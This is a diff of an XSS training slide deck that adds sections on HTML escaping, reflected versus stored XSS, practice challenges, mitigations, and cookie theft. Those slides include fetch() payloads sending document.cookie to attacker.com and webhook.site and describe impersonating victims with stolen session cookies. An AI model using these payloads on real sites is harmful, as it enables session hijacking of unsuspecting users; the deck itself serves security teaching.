@@ -80,6 +80,11 @@
                 <p style="color: white"><span>About me</span> <span style="margin-bottom: 0.5em"
                                                                     class="blinking-cursor">|</span></p>
             </div>
+            <a href="https://www.rewe-digital.com/de">REWE digital</a>
+        </section>
+        <section>
+            <h1>Slides</h1>
+            <a href="https://1-alex98.github.io/xss/">https://1-alex98.github.io/xss/</a>
         </section>
         <section>
             <section>
@@ -404,7 +409,7 @@
                 </p>
             </section>
             <section>
-                <h2>DOM-based XSS: Sources and Sinks</h2>
+                <h3>DOM-based XSS: Sources and Sinks</h3>
                 <div style="display: flex; justify-content: space-around; align-items: flex-start; gap: 1em">
                     <div style="width: 45%; border: 2px solid blue; border-radius: 5px; padding: 1em;">
                         <h3>Sources</h3>
@@ -429,9 +434,26 @@
                         </ul>
                     </div>
                 </div>
+                <p> → HTML escape source to avoid XSS</p>
             </section>
             <section>
-                <h2>The javascript protocol</h2>
+                <section>
+                    <h2>Escaping HTML Characters</h2>
+                    <ul>
+                        <li><code>&lt;</code> for <code>&lt;</code> (less than)</li>
+                        <li><code>&gt;</code> for <code>&gt;</code> (greater than)</li>
+                        <li><code>&amp;</code> for <code>&amp;</code> (ampersand)</li>
+                        <li><code>&quot;</code> for <code>"</code> (double quote)</li>
+                        <li><code>&#39;</code> for <code>'</code> (single quote)</li>
+                    </ul>
+                    <p>Example:</p>
+                    <pre><code>&lt;div&gt;input: &lt;script&gt;alert('XSS')&lt;/script&gt;&lt;/div&gt;</code></pre>
+                    <p>Escaped:</p>
+                    <pre><code>&lt;div&gt;input: &amp;lt;script&amp;gt;alert('XSS')&amp;lt;/script&amp;gt;&lt;/div&gt;</code></pre>
+                </section>
+            </section>
+            <section>
+                <p>Escaping does not always help.</p>
                 <input placeholder="Set the href of the link below" style="font-size: 1em; min-width: 90%" type="text"
                        onchange="document.getElementById('jsLink').href = this.value"/><br>
                 <a id="jsLink">My href is set by the input field</a>
@@ -442,18 +464,18 @@
                 <div style="display: flex; justify-content: space-around; margin-top: 20px;">
                     <div style="width: 45%; border: 2px solid #4285f4; border-radius: 5px; padding: 15px;;font-size: 0.5em">
                         <h3>Reflected XSS</h3>
-                        <p class="fragment" style="font-size: 0.8em">XSS-Payload is part of the request</p>
-                        <p class="fragment" style="font-size: 0.8em">Example: URL-Parameter <code>?search=&lt;script&gt;...&lt;/script&gt;</code>
+                        <p style="font-size: 0.8em">XSS-Payload is part of the request</p>
+                        <p style="font-size: 0.8em">Example: URL-Parameter <code>?search=&lt;script&gt;...&lt;/script&gt;</code>
                         </p>
-                        <p class="fragment" style="font-size: 0.8em">Needs user interaction</p>
-                        <p class="fragment" style="font-size: 0.8em">Not stored on the server</p>
+                        <p style="font-size: 0.8em">Needs user interaction</p>
+                        <p style="font-size: 0.8em">Not stored on the server</p>
                     </div>
                     <div style="width: 45%; border: 2px solid #ea4335; border-radius: 5px; padding: 15px;font-size: 0.5em">
                         <h3>Stored XSS</h3>
-                        <p class="fragment">XSS payload is stored on the server (e.g. a database)</p>
-                        <p class="fragment" style="font-size: 0.8em">Example: Comments, forum posts, profiles</p>
-                        <p class="fragment" style="font-size: 0.8em">Every visitor of the page is affected</p>
-                        <p class="fragment" style="font-size: 0.8em">Persists across multiple page loads</p>
+                        <p>XSS payload is stored on the server (e.g. a database)</p>
+                        <p style="font-size: 0.8em">Example: Comments, forum posts, profiles</p>
+                        <p style="font-size: 0.8em">Every visitor of the page is affected</p>
+                        <p style="font-size: 0.8em">Persists across multiple page loads</p>
                     </div>
                 </div>
                 <p class="fragment" style="margin-top: 30px">Stored XSS has a greater reach and is therefore more
@@ -530,7 +552,7 @@
 									</div>
 									...
 							</code></pre>
-                    <p class="fragment">Have a look at <a href="???">Chall2</a> here we use HTML templating. You can
+                    <p class="fragment">Have a look at <a href="https://xss.vontrostorff.de/chall2">at challenge 2</a> here we use HTML templating. You can
                         even use &lt;script&gt; because the &lt;script&gt; is already there when the site is loaded.</p>
                 </div>
             </section>
@@ -567,6 +589,68 @@
                     <li>Perform actions on behalf of the user</li>
                 </ul>
                 <p>Normally limited to the site, the attacker gains XSS.</p>
+            </section>
+            <section>
+                    <p>Read a Cookie Using JS</p>
+                    <pre><code class="hljs javascript" data-trim data-line-numbers="">
+                        const cookies = document.cookie;
+                    </code></pre>
+                    <p>Read a Cookie Using Dev Tools</p>
+                    <img src="images/dev-cookies.png" style="height: 10vh; object-fit: contain;">
+                    <img src="images/dev-cookies2.png" style="height: 20vh; object-fit: contain;">
+            </section>
+            <section>
+                <p>Try reading the value of the cookie "secret" on this website.</p>
+                <script>
+                    document.cookie = "secrete=42; path=/";
+                </script>
+            </section>
+            <section>
+                    <p>Smuggle the cookie out</p>
+                    <pre><code class="hljs javascript" data-trim data-line-numbers="">
+                        fetch('https://attacker.com/steal-cookie?cookie='+
+                            encodeURI(document.cookie));
+                    </code></pre>
+            </section>
+            <section>
+                <p>Do I have to host my own website? No</p>
+                <p>Use <a href="https://webhook.site">https://webhook.site</a></p>
+                <pre class="fragment"><code class="hljs js" data-trim data-line-numbers="">
+                        fetch('https://webhook.site/your-id?cookie='+
+                            encodeURI(document.cookie));
+                    </code></pre>
+                <p class="fragment">Use the console in the developer tools to try with this website.</p>
+            </section>
+            <section>
+                <h1>What to do after stealing?</h1>
+                <p>If the cookie is used for authentification, set it yourself via dev tools and impersonate the victim.</p>
+            </section>
+            <section>
+                <h3>Challenges</h3>
+                <p>Try get the private post from the admin.</p>
+                <p>The admin views all public posts every minute and deletes them.</p>
+                <p><a href="https://xss.vontrostorff.de/chall3">Challenge 3</a> - Medium</p>
+                <p><a href="https://xss.vontrostorff.de/chall4">Challenge 4</a> - A little bit harder</p>
+                <p>Hint for Challenge 4: Try look into the comments in the HTML</p>
+            </section>
+        </section>
+        <section>
+            <section>
+                <h2>Mitigations for XSS</h2>
+                <ul>
+                    <li>Escaping HTML</li>
+                    <li>Escaping data injected in JS or HTML properties</li>
+                    <li>HTTP-only cookies</li>
+                    <li>CSP</li>
+                </ul>
+            </section>
+        </section>
+        <section>
+            <section>
+                <h2>Thank you for your attention</h2>
+                <a href="https://github.com/1-alex98/xss/tree/master/challenge">Source code challenges</a>
+                <a href="https://github.com/1-alex98/xss">Source code slides</a>
+                <a href="https://xss-game.appspot.com/">Google XSS Challenges</a>
             </section>
         </section>
     </div>
